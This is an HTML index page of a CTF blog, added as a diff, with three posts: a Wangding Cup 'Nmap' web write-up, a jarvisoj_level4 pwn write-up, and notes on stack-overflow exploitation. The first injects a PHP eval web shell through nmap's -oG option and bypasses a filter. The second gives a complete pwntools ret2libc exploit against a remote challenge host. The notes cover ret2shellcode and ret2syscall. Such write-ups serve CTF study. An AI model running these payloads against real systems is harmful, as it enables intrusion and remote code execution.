@@ -1,0 +1,1286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/" class="post-title-link" itemprop="url">网鼎杯2020朱雀组-Nmap</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-07-18 17:23:18 / Modified: 17:40:28" itemprop="dateCreated datePublished" datetime="2022-07-18T17:23:18+08:00">2022-07-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ol>
+<li>打开页面</li>
+</ol>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172428863.png" alt="img"></p>
+<p> 2.利用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=NMAP&spm=1001.2101.3001.7020">NMAP</a>里的-oG命令实现代码的写入，那我们这里就可以尝试构造payload，来利用‘拼接，写入我们想要的shell文件</p>
+<p>我们直接用那道buu里的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; -oG zhuque.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>注入之后发现存在过滤，fuzz,过滤了php</p>
+<p>（1）利用&lt;?&#x3D;来代替&lt;?php进行绕过<br>（2）利用phtml来代替shell.php的文件后缀</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?= eval($_POST[&quot;cmd&quot;]);?&gt; -oG zhuque.phtml&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172548382.png" alt="img"></p>
+<p> 上传成功</p>
+<p>3.打开蚁剑</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_19,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
+<p> 在根目录下找到flag</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172608276.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/jarvisoj_level4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/jarvisoj_level4/" class="post-title-link" itemprop="url">jarvisoj_level4</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-11-11 10:08:01" itemprop="dateCreated datePublished" datetime="2021-11-11T10:08:01+08:00">2021-11-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 09:54:13" itemprop="dateModified" datetime="2022-07-19T09:54:13+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><p><img src="/jarvisoj_level4/1.jpg"></p>
+<p>文件为32位，不可以shellcode。</p>
+<p>使用ida查看重要函数，查看字符串没有发现’&#x2F;bin&#x2F;sh’。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);    <span class="comment">//存在溢出点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造lib，暴露read的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27490</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pwn%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pwn%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">pwn知识点整理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-12 08:39:39" itemprop="dateCreated datePublished" datetime="2021-10-12T08:39:39+08:00">2021-10-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 10:23:29" itemprop="dateModified" datetime="2022-07-19T10:23:29+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="汇编的各个段"><a href="#汇编的各个段" class="headerlink" title="汇编的各个段"></a>汇编的各个段</h3><p>汇编代码把内存氛围以下几个段 bss、data、text、rodata</p>
+<h4 id="bss段："><a href="#bss段：" class="headerlink" title="bss段："></a>bss段：</h4><p>BSS段（bsssegment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。BSS是英文BlockStartedby Symbol的简称。BSS段属于静态内存分配。</p>
+<h4 id="data段："><a href="#data段：" class="headerlink" title="data段："></a>data段：</h4><p>数据段（datasegment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。</p>
+<h4 id="text段："><a href="#text段：" class="headerlink" title="text段："></a>text段：</h4><p>代码段（codesegment&#x2F;textsegment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读,某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
+<h4 id="rodata段："><a href="#rodata段：" class="headerlink" title="rodata段："></a>rodata段：</h4><p>存放C中的字符串和#define定义的常量</p>
+<h4 id="heap堆："><a href="#heap堆：" class="headerlink" title="heap堆："></a>heap堆：</h4><p>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）</p>
+<h4 id="stack栈："><a href="#stack栈：" class="headerlink" title="stack栈："></a>stack栈：</h4><p>用于用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出特点，所以栈特别方便用来保存&#x2F;恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区</p>
+<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wisehead/articles/3819233.html">https://www.cnblogs.com/wisehead/articles/3819233.html</a></p>
+<p>最需要关注的是rbp、rsp、eip。</p>
+<h4 id="rbp与rsp"><a href="#rbp与rsp" class="headerlink" title="rbp与rsp"></a>rbp与rsp</h4><p>rbp与rsp是用于划分栈帧的，rbp是底，rsp是顶。</p>
+<p>rsp永远指向栈中的第一个值，并非空，而rbp指向上一调用函数的rbp。</p>
+<p>push会把参数压栈并把使得ebp-4&#x2F;8，往上移一个位置，pop会弹栈并赋值到指定位置，并使得rsp+4&#x2F;8，往下移一个位置。</p>
+<h4 id="eip"><a href="#eip" class="headerlink" title="eip"></a>eip</h4><p>eip是指明下一指令的地址。</p>
+<h3 id="压栈的顺序"><a href="#压栈的顺序" class="headerlink" title="压栈的顺序"></a>压栈的顺序</h3><h4 id="32位压栈顺序"><a href="#32位压栈顺序" class="headerlink" title="32位压栈顺序"></a>32位压栈顺序</h4><p>首先倒序压函数参数，再压ret地址，最后压rbp。</p>
+<h4 id="64位压栈顺序"><a href="#64位压栈顺序" class="headerlink" title="64位压栈顺序"></a>64位压栈顺序</h4><p>一样首先压ret地址，如果当前函数有rbp则再压rbp。函数参数是寄存器+栈来组合传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p>
+<h3 id="栈溢出的原理"><a href="#栈溢出的原理" class="headerlink" title="栈溢出的原理"></a>栈溢出的原理</h3><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/271/">https://paper.seebug.org/271/</a></p>
+<p>在函数中，有一些输入函数，例如gets、read，如果这些函数在使用的时候没有限制输入的内容长度，那么它们就可能溢出，把输入的内容覆盖到rbp以及ret处。通过构造输入内容，把覆盖的ret地址修改为我们所需要执行的函数就可以控制程序的函数调用了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">如果有参数，则逆序把参数push到栈中</span><br><span class="line">call xxx</span><br><span class="line">相当于</span><br><span class="line">push xxx</span><br><span class="line">mov eip，xxx</span><br><span class="line"></span><br><span class="line">如果函数需要保持栈帧，则在进入函数后的第一条语句进行</span><br><span class="line">push rbp，保存上一函数的rbp地址</span><br><span class="line"></span><br><span class="line">leave</span><br><span class="line">相当于</span><br><span class="line">mov rsp,rbp;``//将ebp指向（ebp内部应当保存一个地址，所谓指向即这个地址对应的空间）的值赋给rsp</span><br><span class="line">pop rbp </span><br><span class="line"></span><br><span class="line">ret</span><br><span class="line">相当于</span><br><span class="line">pop eip</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PLT-amp-GOT表以及延迟绑定机制"><a href="#PLT-amp-GOT表以及延迟绑定机制" class="headerlink" title="PLT&amp;GOT表以及延迟绑定机制"></a>PLT&amp;GOT表以及延迟绑定机制</h3><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1590167">https://cloud.tencent.com/developer/article/1590167</a></p>
+<p>plt：指向函数，在ret2libc题目中，把它的plt地址当函数地址用就行，程序会自动链接到真正的函数地址。</p>
+<p>got：里面存储的是真正的函数地址，在ret2libc题目中，想打印一个函数的真实地址，把它当作输出函数的参数即可，</p>
+<p>例如puts(system的got表地址)。</p>
+<p>plt和call不一样，如果ret到call system的话，system地址后面不需要填充ret地址‘aaaa’或者‘aaaaaaaa’，如果是使用plt跳转的话，则需要填充ret地址</p>
+<h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><h4 id="一：canary"><a href="#一：canary" class="headerlink" title="一：canary"></a>一：canary</h4><p>Canary是金丝雀的意思。技术上表示最先的测试的意思。这个来自以前挖煤的时候，矿工都会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会先报警。所以大家都用canary来搞最先的测试。stack canary表示栈的报警保护。<br>在函数返回值之前添加的一串随机数（不超过机器字长），末位为&#x2F;x00（提供了覆盖最后一字节输出泄露canary的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到canary处，就会改变原本该处的数值，当程序执行到此处时，会检查canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。</p>
+<h4 id="二：NX保护"><a href="#二：NX保护" class="headerlink" title="二：NX保护"></a>二：NX保护</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。栈溢出的核心就是通过局部变量覆盖返回地址，然后加入shellcode，NX策略是使栈区域的代码无法执行。<br>当NX保护开启，就表示题目给了你system（‘&#x2F;bin&#x2F;sh’），如果关闭，表示你需要自己去构造shellcode，可参考我的level2</p>
+<h4 id="三：PIE"><a href="#三：PIE" class="headerlink" title="三：PIE"></a>三：PIE</h4><p>PIE（ASLR），内存地址随机化机制（address space layout randomization)，有以下三种情况<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加堆（heap）的随机化。<br>该保护能使每次运行的程序的地址都不同，防止根据固定地址来写exp执行攻击。<br>liunx下关闭PIE的命令如下：<br>sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
+<h4 id="四：RELRO"><a href="#四：RELRO" class="headerlink" title="四：RELRO"></a>四：RELRO</h4><p>Relocation Read-Only (RELRO) 可以使程序某些部分成为只读的。它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。</p>
+<p>部分RELRO 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。</p>
+<p>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
+<h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><h4 id="gets-void-buf"><a href="#gets-void-buf" class="headerlink" title="gets(void * buf)"></a>gets(void * buf)</h4><p>直到遇到回车结束，直接读取一行，忽略’\x00’</p>
+<h4 id="read-int-fd-void-buf-size-t-count"><a href="#read-int-fd-void-buf-size-t-count" class="headerlink" title="read(int fd, void * buf, size_t count);"></a>read(int fd, void * buf, size_t count);</h4><p>读count长度的内容，如果count比buf输入缓冲要大，则造成溢出</p>
+<h4 id="scanf-const-char-format-…"><a href="#scanf-const-char-format-…" class="headerlink" title="scanf(const char *format,…)"></a>scanf(const char *format,…)</h4><p>从标准输入 stdin 读取格式化输入</p>
+<p>还有strcpy、strcat，遇到’\x00’停止</p>
+<h3 id="栈溢出的基本类型"><a href="#栈溢出的基本类型" class="headerlink" title="栈溢出的基本类型"></a>栈溢出的基本类型</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>思路：通过输入函数的溢出覆盖ret地址，修改ret地址为我们需要执行的函数，控制程序的流向。</p>
+<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/179724.html">https://www.freebuf.com/vuls/179724.html</a></p>
+<p>适用情况：NX保护未开启，栈拥有可执行权限</p>
+<p>思路：通过输入函数把shellcode写到栈中，然后覆盖ret地址指向shellcode的起始地址，指向shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># context(os=&quot;linux&quot;, arch=&quot;i386&quot;)  32位系统* </span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)   <span class="number">64</span>位系统</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/234228.html">https://www.freebuf.com/articles/system/234228.html</a></p>
+<p>思路：调用int80，设置eax、ebx、ecx、edx，把ret地址设置为int_80的地址即可。</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>1、rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
+<p>2、gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。</p>
